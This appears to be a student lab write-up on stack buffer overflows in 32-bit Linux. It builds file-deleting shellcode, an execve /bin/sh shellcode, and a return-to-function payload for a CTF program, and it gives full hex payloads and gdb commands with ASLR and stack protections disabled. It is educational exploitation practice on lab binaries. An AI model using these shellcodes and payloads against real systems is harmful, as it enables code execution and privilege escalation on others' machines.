# 1. Inject code to delete file

## a. Inject code

file_del.asm

![Picture about file_del.asm](/Chapter-2/imgs/Inject/Inject-file_del.png)

Now, we get the shellcode of this program
- `nasm -g -f elf file_del.asm`
- `ld -m elf_i386 -o file_del file_del.o`
- `for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`

![Picture about shellcode of file_del.asm](/Chapter-2/imgs/Inject/Inject-shellcode.png)

The shell code is `\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00\xdummyfile`
- However, `\xdummyfile` is not valid hexdecimal code.
- We only get `\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00`

Stack frame of `vuln.c`

![Picture about stackframe of vuln.c](/Chapter-2/imgs/Inject/Inject-Stack-Frame.png)

Insert 36 bytes shellcode + 32 bytes random character + overwrite 4 bytes ret addr = 72 bytes = buf + ebp + ret addr

Now we use gdb to observe the process
- `gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`
- Breakpoint at 0x0804846b <+48>

![Picture about creating breapoint at 0x0804846b](/Chapter-2/imgs/Inject/Inject-1-breakpoint.png)
- `r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xff\xff\xff\xff')")`

![Picture about watching gdb](/Chapter-2/imgs/Inject/Inject-1-esp.png)

Based on picture, we see that `strcpy` only copy first 3 bytes of shellcode. Why?

Because there are some noticeable characters which can interupt/split the argument if we look at ASCII table:
- `0x00` the end of a string.
- `0x09` the tab character.
- `0x0a` the newline character. 

Here the value `\x0a` comes from the line `move eax,10`. Therefor, we will change file_del.asm

![Picture about changing file_del 1st time](/Chapter-2/imgs/Inject/Inject-file_del-edited-1st.png)

Now we get the shellcode of modified file_del.asm
- `nasm -g -f elf file_del.asm`
- `ld -m elf_i386 -o file_del file_del.o`
- `for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`

![Picture about watching shellcode of file_del.asm](/Chapter-2/imgs/Inject/Inject-file_del-shellcode-1st.png)
- `\xeb\x16\xb8\x08\x00\x00\x00\x83\xc0\x02\xbb\x7d\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe5\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00`

Why do we still get `\x00`? 

When we insert the values ​​1, 8 in the mov and add instructions, the 32-bit register `eax` will have the values ​​`\x01\x00\x00\x00` and `\x08\x00\x00\x00` respectively. So we need to use a smaller register like `al` in this case. In addition, we need to set `eax` to zero completely before assigning a value to `al` because the operating system is 32-bit.

![Picture about changing file_del 2nd time](/Chapter-2/imgs/Inject/Inject-file_del-edited-2nd.png)

Now we get the shellcode of modified 2nd file_del.asm
- `nasm -g -f elf file_del.asm`
- `ld -m elf_i386 -o file_del file_del.o`
- `for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`

![Picture about watching shellcode of file_del.asm](/Chapter-2/imgs/Inject/Inject-file_del-shellcode-2nd.png)
- `\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00`

We need to replace the last byte `\x00` with another byte
- `r $(python –c "print ('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0c' + 'a'*32 + '\xff\xff\xff\xff')")` 

After using gdb, we find out the return address

![Picture about watching gdb](/Chapter-2/imgs/Inject/Inject-2-esp.png)

We will replace it with the address of buf `0xffffd6e8`
- `r $(python –c "print ('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0c' + 'a'*32 + '\xe8\xd6\xff\xff')")`

We can execute this program. However, `dummyfile` still remains. What wrong?

![Picture about watching ls](/Chapter-2/imgs/Inject/Inject-2-ls.png)

Now, we have to turn back and watch shellcode again
- `objdump -d file_del`

![Picture about shellcode of file_del](/Chapter-2/imgs/Inject/Inject-file_del-shellcode-3th.png)
- `0804807a` the address of `_filename`
- `\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00` is a value (`dummyfile`) of `_filename`

Now we watch the program

![Picture about watching gdb](/Chapter-2/imgs/Inject/Inject-3-esp.png)
- `0804807a` the address of `_filename` is wrong because the address is changed. It is `0xffffd702`
- `\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0c` is a wrong value of `_filename`. We have to change the last byte to `\x00` by using `set {unsigned char} 0xffffd70b = 0x00`

So the final command is `r $(python –c "print ('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x02\xd7\xff\xff\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0c' + 'a'*32 + '\xe8\xd6\xff\xff')")`
- `set {unsigned char} 0xffffd70b = 0x00` after stopping at breakpoint

![Picture about watching ls](/Chapter-2/imgs/Inject/Inject-3-ls.png)

Finally, when we use `ls`, we know that we successfully delete `dummyfile`.

## b. Privilege escalation 

Before deleting file

![Picture before deleting](/Chapter-2/imgs/Privilege/Privilege-dummyfile.png)

File sh.asm

![Picture about sh.asm](/Chapter-2/imgs/Privilege/sh.png)

Firstly, we have to assembles the assembly source file and links the object file to create an executable file

`nasm -g -f elf sh.asm
ld -m elf_i386 -o sh sh.o
`

After that, we use `for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo` to extracts the machine code.
- `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80`
- This program is 27 bytes

We need to get the shellcode into buf in vuln; insert the starting position of buf into ret addr so that the program goes back to executing the command we just inserted into buf.

Stack frame:

![Picture about program](/Chapter-2/imgs/Privilege/Privilege-Stack-Frame.png)

Insert 27 bytes shellcode + 41 bytes random character + overwrite 4 bytes ret addr = 72 bytes = buf + ebp + ret addr

Set up:
- `gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`
- `sudo ln -sf /bin/zsh /bin/sh` create new shell that allows code execution on stack, default does not allow

Using gdb and watch main()

![Picture about gdb of main](/Chapter-2/imgs/Privilege/Privilege-gdb-main.png)

Create breakpoints
- Set at +6, after stackframe is set
- Set at +48, ​​before strcpy we see that eax has been pushed twice so esp is now - 8 bytes. Therefore, we set breakpoint after adding 8 bytes to esp

![Picture about creating breakpoints](/Chapter-2/imgs/Privilege/Privilege-breakpoint.png)

Use `r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'a'*41 + '\xff\xff\xff\xff’)")`
- set 4 bytes of ret addr to 0xffffffff for easy searching

After setting stackframe

![Picture gdb at +6](/Chapter-2/imgs/Privilege/Privilege-plus6.png)

After strcpy

![Picture gdb at +48](/Chapter-2/imgs/Privilege/Privilege-gdb-before.png)

Now we know where ret addr is. Now we replace ret addr with $esp.

![Picture about replacing value of ret addr](/Chapter-2/imgs/Privilege/Privilege-gdb-after.png)

The address in ret addr has been replaced with esp so the program returns and continues executing the instructions in the stack frame.

Then we use `rm -r -f dummyfile` to delete file
- `rm` (remove) command
- `-f` (force) option to bypass protection or requires confirmation
- `-r` (recursive) option

![Picture about using command to delete file](/Chapter-2/imgs/Privilege/Privilege-delete.png)

The result is that we delete successfully dummyfile

![Picture about using command to delete file](/Chapter-2/imgs/Privilege/Privilege-result.png)

# 2. Conduct attack on ctf.c

![Picture about ctf.c](/Chapter-2/imgs/ctf/ctf.png)

The vulnerability is strcpy(buf, s) at line 31 because s can have a longer length than buf.

First, we have to set up system `sudo sysctl -w kernel.randomize_va_space=0` so that system doesn't random variable's address

Normal stack frame of the program:

![Picture about ctf.c stack frame](/Chapter-2/imgs/ctf/ctf-Stack-Frame-normal.png)

If we want the program to run the function myfunc(), we need to assign its address to the return address of vuln().

Using gdb and `disas myfunc` we know `0x0804851b` is its address:

![Picture about using gdb myfunc()](/Chapter-2/imgs/ctf/ctf-gdb.png)

Stack frame of myfunc():

![Picture about myfunc stack frame](/Chapter-2/imgs/ctf/ctf-Stack-Frame-myfunc.png)

However, because we perform buffer overflow to execute the myfunc() function, we are missing 2 arguments p and q:

![Picture about ctf.c stack frame buffer](/Chapter-2/imgs/ctf/ctf-Stack-Frame-buffer.png)

Based on the stack frame, ebp of main() must contain the value of p and ret addr of main() must contain the value of q

`./ctf.out $(python -c "print(104*'a' + '\x1b\x85\x04\x08' + 4*'a' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`
- `104*'a'` assigns arbitrary values ​​to buf and ebp of vuln()
- `\x1b\x85\x04\x08` assigns the address of myfunc() to the ret addr of vuln()
- `4*'a'` assigns arbitrary value to s of vuln()
- `\x11\x12\x08\x04` assigns the value p to the ebp of main()
- `\x62\x42\x64\x44` assigns the value q to the ret addr of main()

![Picture about result](/Chapter-2/imgs/ctf/ctf-result.png)
